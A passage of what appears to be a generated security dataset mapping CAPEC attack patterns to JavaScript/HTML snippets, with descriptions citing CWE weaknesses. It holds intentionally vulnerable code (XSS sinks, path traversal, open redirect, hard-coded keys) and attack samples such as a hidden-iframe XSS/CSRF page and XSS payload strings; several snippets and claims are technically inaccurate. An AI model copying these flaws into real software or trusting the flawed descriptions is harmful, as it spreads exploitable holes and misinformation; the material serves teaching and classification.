        "description": "This JavaScript code snippet demonstrates a basic TCP server that deserializes incoming data without proper validation, embodying the concept of 'Object Injection' (CAPEC-131). The `SensitiveData` class represents a class that could contain sensitive information (CWE-499). The `deserialize` function uses `JSON.parse` to convert the incoming data back into an object, which is a common deserialization method. The server listens for incoming connections and attempts to deserialize any received data. The client sends a malicious payload that exploits the deserialization process, potentially leading to prototype pollution or other unintended behaviors. This example highlights the risks associated with deserializing untrusted data (CWE-502) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Malicious Page</title>\n</head>\n<body>\n    <h1>Welcome to the Malicious Page</h1>\n    <iframe id=\"legitFrame\" src=\"https://legitimate-website.com\" style=\"display:none;\"></iframe>\n    <script>\n        // Wait for the iframe to load\n        document.getElementById('legitFrame').onload = function() {\n            var iframe = document.getElementById('legitFrame').contentWindow;\n            // Attempt to interact with the legitimate page\n            try {\n                // Example of XSS vulnerability exploitation\n                iframe.document.body.innerHTML += '<img src=\"x\" onerror=\"alert(\\'XSS Attack\\')\">';\n                // Example of CSRF attack\n                iframe.document.forms[0].submit();\n            } catch (e) {\n                console.log('Error interacting with iframe:', e);\n            }\n        };\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross Frame Scripting (XFS) attack. The malicious page contains an iframe that loads a legitimate website. Once the iframe is loaded, the malicious JavaScript attempts to interact with the legitimate page. It tries to inject an XSS payload by adding an IMG tag with an onerror attribute, and it also attempts a CSRF attack by submitting a form within the iframe. This attack leverages improper restriction of rendered UI layers or frames (CWE-1021), improper neutralization of input (CWE-79), and CSRF vulnerabilities (CWE-352). The iframe is hidden from the user, making the attack stealthy and leveraging social engineering to lure the user to the malicious page."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var userInput = document.location.hash.substring(1);\n  var targetElement = document.getElementById('output');\n  targetElement.innerHTML = 'User input: ' + userInput;\n});",
        "description": "This JavaScript code snippet demonstrates a DOM-Based XSS vulnerability. When the DOM content is fully loaded, it extracts user input from the URL hash fragment (i.e., the part of the URL after the # symbol) and directly inserts it into the innerHTML of an element with the ID 'output'. This code does not perform any input validation or output encoding, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the hash fragment, which would then be executed in the context of the web page, bypassing any server-side filtering."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const hostname = req.headers.host;\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('DNS lookup failed');\n      return;\n    }\n    if (address === '192.168.1.1') { // Example of blocking a specific IP\n      res.writeHead(403);\n      res.end('Access Denied');\n    } else {\n      res.writeHead(200);\n      res.end('Request Successful');\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) and processes incoming requests. It uses the 'dns.lookup' function to resolve the hostname from the request headers to an IP address. If the IP address matches a specific value (e.g., '192.168.1.1'), the server blocks the request by responding with a 403 status code, effectively demonstrating DNS blocking. This code embodies the CAPEC concept of DNS Blocking by intercepting and conditionally dropping DNS requests based on their content. It also highlights related CWEs such as 'Binding to an Unrestricted IP Address' (CWE-1327) and 'Reliance on IP Address for Authentication' (CWE-291)."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const blockedIP = '192.168.1.100';\n\n  if (clientIP === blockedIP) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, world!');\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that listens on all network interfaces (0.0.0.0) and blocks access from a specific IP address (192.168.1.100). The server checks the client's IP address and returns a '403 Access Denied' response if the IP matches the blocked IP. Otherwise, it responds with 'Hello, world!'. This code demonstrates the concept of IP Address Blocking (CAPEC) and incorporates CWE-1327 (Binding to an Unrestricted IP Address) and CWE-291 (Reliance on IP Address for Authentication). The server's reliance on the client's IP address for access control is a weak security measure, as IP addresses can be spoofed or changed."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Reflected XSS Example</title>\n</head>\n<body>\n    <h1>Search Results</h1>\n    <div id=\"results\"></div>\n    <script>\n        // Simulate user input from URL parameter\n        var params = new URLSearchParams(window.location.search);\n        var query = params.get('query');\n\n        // Vulnerable code: directly inserting user input into the DOM without proper sanitization\n        document.getElementById('results').innerHTML = 'You searched for: ' + query;\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Reflected XSS vulnerability. The script extracts a 'query' parameter from the URL and directly inserts it into the DOM without proper sanitization. This allows an attacker to craft a URL with malicious JavaScript code in the 'query' parameter, which will be executed when the victim visits the URL. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by showing how user input can be improperly handled, leading to XSS attacks."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Stored XSS Example</title>\n</head>\n<body>\n    <h1>Comments</h1>\n    <form method=\"POST\" action=\"/submit_comment\">\n        <textarea name=\"comment\"></textarea>\n        <button type=\"submit\">Submit</button>\n    </form>\n    <div id=\"comments\">\n        <!-- Assume comments are fetched from a database and inserted here -->\n        <script>\n            // Example of stored XSS vulnerability\n            var comments = [\n                \"<img src='x' onerror='alert(1)'>\", // CWE-82\n                \"<script>alert('XSS')</script>\", // CWE-79\n                \"<img src='x' onerror='alert(1)'>\".replace(/</g, \"<<\") // CWE-85\n            ];\n            comments.forEach(function(comment) {\n                document.getElementById('comments').innerHTML += '<p>' + comment + '</p>';\n            });\n        </script>\n    </div>\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a stored XSS vulnerability. The form allows users to submit comments, which are then stored in a database. When the comments are retrieved and displayed, they are not properly sanitized, allowing malicious scripts to execute. The comments array includes examples of XSS payloads that exploit various CWEs: CWE-82 (improper neutralization of script in IMG tags), CWE-79 (improper neutralization of input during web page generation), and CWE-85 (doubled character XSS manipulations). This code highlights the importance of proper input validation and output encoding to prevent stored XSS attacks."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 60000 }\n}));\n\napp.post('/login', (req, res) => {\n  // Simulate user authentication\n  req.session.user = { id: 'user123' };\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) {\n    res.send('Welcome to your dashboard, ' + req.session.user.id);\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The code demonstrates a potential vulnerability related to session hijacking. The session is created with a fixed secret key and does not invalidate existing session identifiers upon user login (CWE-384). Additionally, the session expiration is set to a short duration, but it may still be insufficient (CWE-613). The code also does not properly authenticate the user beyond setting a session variable (CWE-287). This setup can allow an attacker to hijack or manipulate sessions, gaining unauthorized access to the application, which embodies the main idea of the CAPEC for session hijacking."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, 'example.com', () => {\n  console.log('Connected');\n  client.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Injecting malicious traffic\n  client.write('MALICIOUS_PAYLOAD');\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client using the 'net' module to connect to a server on port 8080. After establishing the connection, it sends a standard HTTP GET request. Upon receiving data from the server, it injects a malicious payload back into the communication channel. This embodies the CAPEC concept of 'Traffic Injection' by showing how an adversary can inject specific traffic into an existing network connection. The code also highlights several related CWEs: it does not verify the source of the communication (CWE-940), it sends data in cleartext (CWE-319), and it does not ensure message integrity (CWE-924)."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst targetIP = '192.168.1.10';\nconst targetPort = 8080;\n\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to target');\n  // Simulate sending a reset packet\n  client.write('RST');\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});",
        "description": "This JavaScript code snippet uses the 'net' module to create a TCP client that connects to a target IP and port. Once connected, it simulates sending a reset packet ('RST') to the target, which can cause the target to sever the connection. This embodies the main idea of the CAPEC 'Connection Reset' attack pattern. The code does not verify the source of the communication channel (CWE-940), does not ensure message integrity (CWE-924), and does not correctly specify the intended destination (CWE-941). Additionally, it could be vulnerable to capture-replay attacks (CWE-294) and multiple binds to the same port (CWE-605)."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.100';\nconst targetPort = 80;\nconst fakeRSTPacket = Buffer.from('45000028a6f400004006b1e6c0a80101c0a80164', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to target');\n  client.write(fakeRSTPacket);\n  console.log('Sent fake RST packet');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RST Injection attack. It uses the 'net' module to create a TCP connection to a target IP and port. Once connected, it sends a fake TCP RST packet to the target, aiming to terminate the TCP connection. This embodies the main idea of CAPEC-297 (TCP RST Injection). The code also touches on CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the source of the communication, allowing an adversary to inject malicious packets. The code is a simplified example and does not include the full complexity of crafting a valid TCP RST packet."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The main vulnerability here is the use of 'req.url' directly to construct the file path with 'path.join(__dirname, req.url)'. This allows an attacker to perform an absolute path traversal attack by manipulating the URL to include sequences like '/../', potentially accessing sensitive files outside the intended directory. This snippet embodies the main idea of CAPEC-36 and related CWEs by demonstrating how improper handling of user input in file path construction can lead to security vulnerabilities."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst targetDomain = 'example.com';\nconst maliciousIP = '192.0.2.1';\n\n// Simulate DNS Spoofing by overriding DNS resolution\nconst originalLookup = dns.lookup;\ndns.lookup = (hostname, options, callback) => {\n  if (hostname === targetDomain) {\n    return callback(null, { address: maliciousIP, family: 4 });\n  }\n  return originalLookup(hostname, options, callback);\n};\n\n// Example of a security-critical action based on DNS resolution\nhttp.get(`http://${targetDomain}`, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log(data); });\n}).on('error', (err) => { console.error('Error:', err.message); });",
        "description": "This JavaScript code snippet demonstrates a DNS Spoofing attack by overriding the DNS resolution for a specific target domain ('example.com'). The 'dns.lookup' function is modified to return a malicious IP address ('192.0.2.1') for the target domain. When an HTTP request is made to the target domain, it is redirected to the malicious IP address. This example highlights the vulnerability of relying on DNS resolution for security-critical actions (CWE-350) and the potential for incorrect destination specification in communication channels (CWE-941). The code also indirectly touches on the risks of downloading code without integrity checks (CWE-494) and server-side request forgery (CWE-918) by demonstrating how an attacker can manipulate DNS responses to redirect traffic."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst serverAddress = '192.168.1.100'; // Intended server address\nconst port = 8080;\n\nclient.connect(port, serverAddress, () => {\n  console.log('Connected to server');\n  // Sending sensitive data in cleartext\n  client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // No integrity check on received data\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information (username and password) in cleartext. The code does not ensure the integrity of the received data, nor does it verify that it is communicating with the correct endpoint. This makes it vulnerable to several weaknesses: cleartext transmission of sensitive information (CWE-319), improper enforcement of message integrity (CWE-924), and improper restriction of communication channel to intended endpoints (CWE-923). The code represents the main idea of the CAPEC by showing how an attacker could exploit these vulnerabilities to disrupt or intercept communications."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password1', 'user2': 'password2' }; // CWE-522\nlet loginAttempts = {}; // CWE-307\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (!loginAttempts[username]) loginAttempts[username] = 0;\n  if (loginAttempts[username] >= 5) { // CWE-307\n    return res.status(429).send('Too many attempts, try again later.');\n  }\n  if (users[username] && users[username] === password) {\n    loginAttempts[username] = 0;\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username]++;\n    return res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It demonstrates the concept of Credential Stuffing (CAPEC-562) by showing how an adversary might attempt to use known username/password combinations to gain access. The code includes several related weaknesses: CWE-522 (Insufficiently Protected Credentials) by storing passwords in plain text, CWE-307 (Improper Restriction of Excessive Authentication Attempts) by implementing a basic mechanism to limit login attempts, and CWE-308 (Use of Single-factor Authentication) by relying solely on username and password for authentication. The code is vulnerable to Credential Stuffing attacks due to these weaknesses."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    // CWE-924: No integrity check\n    if (data.toString().includes('STOP')) {\n      // CWE-923: No endpoint verification\n      socket.write('Stopping server...');\n      server.close();\n    } else {\n      // CWE-406: No control of message volume\n      for (let i = 0; i < 1000; i++) {\n        socket.write('Echo: ' + data.toString());\n      }\n    }\n  });\n\n  // CWE-421: Race condition on alternate channel\n  setTimeout(() => {\n    socket.write('Alternate channel open');\n  }, 1000);\n});\n\nserver.listen(8080, '127.0.0.1');\nconsole.log('Server listening on port 8080');",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities: \n1. CWE-319: Sensitive information is logged in cleartext.\n2. CWE-924: There is no integrity check on the received data.\n3. CWE-923: The server does not verify the endpoint before performing privileged operations.\n4. CWE-406: The server does not control the volume of messages sent back to the client, potentially leading to network amplification.\n5. CWE-421: An alternate communication channel is opened without proper access control, leading to a potential race condition.\n\nThese vulnerabilities collectively illustrate the concept of 'Jamming,' where an adversary can disrupt communications by exploiting these weaknesses."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "const crypto = require('crypto');\n\n// Using an obsolete function for cryptographic operations\nfunction insecureHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Example usage\nconst userData = 'sensitiveData';\nconst hashedData = insecureHash(userData);\nconsole.log('Hashed Data:', hashedData);",
        "description": "This JavaScript code snippet demonstrates the use of an obsolete cryptographic function, `md5`, which is considered insecure and deprecated. The function `insecureHash` takes user data and hashes it using MD5. This represents the CAPEC concept of 'Degradation' by using deprecated or obsolete functions (CWE-477), which can lead to security vulnerabilities. The use of MD5 is a specific example of relying on outdated technology that may not provide adequate security, thus embodying the idea of degradation in security practices."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet resourceCount = 0;\nconst MAX_RESOURCES = 100;\n\napp.get('/allocate', (req, res) => {\n  if (resourceCount >= MAX_RESOURCES) {\n    return res.status(503).send('Service Unavailable: Resource limit reached');\n  }\n  resourceCount++;\n  res.send('Resource allocated');\n});\n\napp.get('/release', (req, res) => {\n  if (resourceCount > 0) {\n    resourceCount--;\n    res.send('Resource released');\n  } else {\n    res.status(400).send('No resources to release');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allocates and releases resources. The server has a maximum limit of 100 resources that can be allocated. The '/allocate' endpoint increments the resource count and checks if the limit has been reached, returning a 503 status code if no more resources can be allocated. The '/release' endpoint decrements the resource count if there are resources to release. This code demonstrates the concept of resource allocation without proper limits (CWE-770) and the potential for resource exhaustion (CWE-400), which can lead to a denial of service, embodying the main idea of the CAPEC 'Blockage'."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "const wifiChannel = 'channel-6';\nconst deauthFrame = new Uint8Array([0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);\n\nfunction sendDeauthFrame() {\n  // Simulate sending deauthentication frames to the Wi-Fi channel\n  console.log(`Sending deauthentication frame to ${wifiChannel}`);\n  // In a real scenario, this would involve using a library or API to send the frame over the network\n}\n\nfunction floodWiFiChannel() {\n  setInterval(sendDeauthFrame, 100); // Send deauth frames every 100ms\n}\n\nfloodWiFiChannel();",
        "description": "This JavaScript code snippet simulates a Wi-Fi jamming attack by repeatedly sending deauthentication frames to a specified Wi-Fi channel. The `sendDeauthFrame` function logs the action of sending a deauthentication frame, and the `floodWiFiChannel` function uses `setInterval` to call `sendDeauthFrame` every 100 milliseconds, effectively flooding the Wi-Fi channel. This represents the CAPEC scenario of Wi-Fi jamming by actively transmitting on the Wi-Fi channel to disrupt communication. The related CWEs provide context on potential weaknesses, such as improper enforcement of message integrity (CWE-924), improper restriction of communication channels (CWE-923), and cleartext transmission of sensitive information (CWE-319), which can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '192.168.1.1', () => {\n    console.log('Connected to cell tower');\n    // CWE-319: Transmitting sensitive information in cleartext\n    client.write('AUTH: user=admin&pass=1234');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-924: No integrity check on received message\n    if (data.toString().includes('STATUS:')) {\n        // CWE-300: Channel accessible by non-endpoint\n        console.log('Status message received');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Simulate jamming by sending noise\nsetInterval(() => {\n    // CWE-940: No verification of source\n    client.write('NOISE: ' + Math.random().toString(36).substring(7));\n}, 1000);",
        "description": "This JavaScript code snippet simulates a cellular jamming attack by establishing a TCP connection to a cell tower and sending cleartext authentication information (CWE-319). It does not verify the integrity of received messages (CWE-924) and allows the channel to be accessed by non-endpoints (CWE-300). Additionally, it periodically sends random noise to simulate jamming (CWE-940). The code represents the main idea of the CAPEC by demonstrating how an attacker can disrupt communication between a cellular user device and a cell tower using various vulnerabilities."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(availableAlgorithms) {\n  // CWE-757: Select the weakest algorithm available\n  const selectedAlgorithm = availableAlgorithms.includes('A5/0') ? 'A5/0' : availableAlgorithms[0];\n  return selectedAlgorithm;\n}\n\nfunction encryptData(data, algorithm) {\n  // CWE-326: Use weak encryption\n  if (algorithm === 'A5/0') {\n    return data; // No encryption\n  } else if (algorithm === 'A5/1' || algorithm === 'A5/2') {\n    const cipher = crypto.createCipher(algorithm, 'hardcodedkey'); // CWE-321: Hard-coded key\n    let encrypted = cipher.update(data, 'utf8', 'hex');\n    encrypted += cipher.final('hex');\n    return encrypted;\n  } else {\n    throw new Error('Unsupported algorithm');\n  }\n}\n\nconst availableAlgorithms = ['A5/0', 'A5/1', 'A5/2'];\nconst selectedAlgorithm = negotiateEncryption(availableAlgorithms);\nconst data = 'Sensitive Data';\nconst encryptedData = encryptData(data, selectedAlgorithm);\nconsole.log(`Algorithm: ${selectedAlgorithm}, Encrypted Data: ${encryptedData}`);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Weakening of Cellular Encryption' by simulating the negotiation and use of weak or no encryption algorithms. The `negotiateEncryption` function (CWE-757) selects the weakest available algorithm, prioritizing 'A5/0' (no encryption). The `encryptData` function then applies the selected algorithm, using a hard-coded key (CWE-321) for 'A5/1' and 'A5/2' (CWE-326). The code highlights the vulnerabilities associated with using weak or no encryption, hard-coded keys, and the selection of less secure algorithms during negotiation."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "const fs = require('fs');\n\n// Simulate improper isolation by sharing a critical resource\nlet criticalResource = 'Initial State';\n\n// Function that simulates a protection mechanism failure\nfunction protectionMechanismFailure() {\n  // Incorrectly handle the critical resource\n  criticalResource = 'Compromised State';\n  console.log('Protection mechanism failed, resource compromised.');\n}\n\n// Function that simulates unauthorized error injection\nfunction unauthorizedErrorInjection() {\n  // Inject an error into the critical resource\n  criticalResource = 'Error State';\n  console.log('Unauthorized error injected, system degraded.');\n}\n\n// Function that simulates improper handling of faults\nfunction improperFaultHandling() {\n  // Skip critical instruction\n  if (Math.random() > 0.5) {\n    console.log('Critical instruction skipped, fault not handled properly.');\n  }\n}\n\n// Function that simulates a race condition\nfunction raceCondition() {\n  // Simulate a race condition by accessing the critical resource concurrently\n  setTimeout(() => {\n    criticalResource = 'Race Condition State';\n    console.log('Race condition occurred, resource state:', criticalResource);\n  }, Math.random() * 1000);\n}\n\n// Simulate obstruction by calling the functions\nprotectionMechanismFailure();\nunauthorizedErrorInjection();\nimproperFaultHandling();\nraceCondition();\n\n// Log the final state of the critical resource\nsetTimeout(() => {\n  console.log('Final state of critical resource:', criticalResource);\n}, 2000);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Obstruction' by simulating various vulnerabilities that can lead to system degradation or failure. The code includes functions that represent different CWEs related to the CAPEC: \n1. `protectionMechanismFailure` simulates a failure in the protection mechanism, compromising a critical resource.\n2. `unauthorizedErrorInjection` simulates the injection of an error into a critical resource, degrading the system.\n3. `improperFaultHandling` simulates improper handling of faults, potentially skipping critical instructions.\n4. `raceCondition` simulates a race condition by accessing a critical resource concurrently.\n\nThe final state of the critical resource is logged after a delay, showing the impact of these vulnerabilities. This code embodies the main idea of the CAPEC by demonstrating how obstructing interactions between system components can lead to a degraded state or system failure."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Use of a broken or risky cryptographic algorithm (CWE-327)\nconst algorithm = 'aes-128-cbc'; // Weak encryption algorithm\nconst key = '1234567890123456'; // Hard-coded cryptographic key (CWE-321)\nconst iv = crypto.randomBytes(16);\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encryptedText) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\n// Example usage\nconst message = 'Sensitive data';\nconst encryptedMessage = encrypt(message);\nconsole.log('Encrypted:', encryptedMessage);\nconst decryptedMessage = decrypt(encryptedMessage);\nconsole.log('Decrypted:', decryptedMessage);",
        "description": "This JavaScript code snippet demonstrates the use of a broken or risky cryptographic algorithm (CWE-327) and a hard-coded cryptographic key (CWE-321). The code uses the 'aes-128-cbc' algorithm, which is considered weak by modern standards, to encrypt and decrypt a message. The key is hard-coded, making it easier for an attacker to recover the encrypted data. This snippet embodies the main idea of the CAPEC by illustrating how weak encryption and poor key management can lead to vulnerabilities in cellular encryption, potentially allowing an attacker to decrypt sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Invalid request source');\n    return;\n  }\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'user_password=123456';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It demonstrates several vulnerabilities related to the CAPEC 'Cellular Traffic Intercept' and associated CWEs. The server checks for a custom header to verify the source of the communication channel (CWE-940), but this verification is weak and can be easily bypassed. Additionally, the server transmits sensitive information (a user password) in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. This code embodies the main idea of the CAPEC by illustrating how improper verification and cleartext transmission can lead to the interception of sensitive data."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  res.setEncoding('utf8');\n  res.on('data', (chunk) => {\n    console.log(`BODY: ${chunk}`);\n  });\n  res.on('end', () => {\n    console.log('No more data in response.');\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Injecting sensitive data into the request body\nconst sensitiveData = {\n  username: 'admin',\n  password: 'password123'\n};\n\n// Sending sensitive data in cleartext\nreq.write(JSON.stringify(sensitiveData));\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a vulnerable HTTP POST request to a server. It embodies the main idea of the CAPEC 'Cellular Data Injection' by showing how an adversary could inject sensitive data into the traffic. The code also highlights several related CWEs: \n1. CWE-319: The sensitive data (username and password) is transmitted in cleartext, making it susceptible to interception.\n2. CWE-201: Sensitive information is included in the sent data, which should not be accessible to unauthorized actors.\n3. CWE-924: There is no integrity check to ensure the message was not modified during transmission.\nThis example illustrates how improper handling of sensitive data and lack of security measures can lead to vulnerabilities in mobile technology traffic."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<html><body><form method=\"GET\"><input type=\"text\" name=\"redirect\" placeholder=\"Enter URL\"><input type=\"submit\" value=\"Go\"></form></body></html>');\n  }\n}).listen(8080, () => console.log('Server running at http://localhost:8080/'));\n",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming GET requests and checks if a 'redirect' query parameter is present. If the 'redirect' parameter is found, the server responds with a 302 redirect to the specified URL. Otherwise, it serves a simple HTML form that allows the user to input a URL to redirect to. This code demonstrates the concept of BitSquatting by potentially redirecting users to a malicious site if the 'redirect' parameter is manipulated. It also embodies CWE-601 (Open Redirect) by allowing user-controlled input to specify the redirect URL, CWE-598 (Use of GET Request Method With Sensitive Query Strings) by using GET requests with query strings, and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page) by not validating the redirect URL."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "const wifi = require('node-wifi');\nconst fs = require('fs');\n\nwifi.init({ iface: null });\n\nfunction logMacAddresses() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    const macAddresses = networks.map(network => network.mac);\n    fs.writeFile('mac_addresses.txt', macAddresses.join('\\n'), (err) => {\n      if (err) {\n        console.error('Error writing MAC addresses to file:', err);\n      } else {\n        console.log('MAC addresses logged successfully.');\n      }\n    });\n  });\n}\n\nlogMacAddresses();",
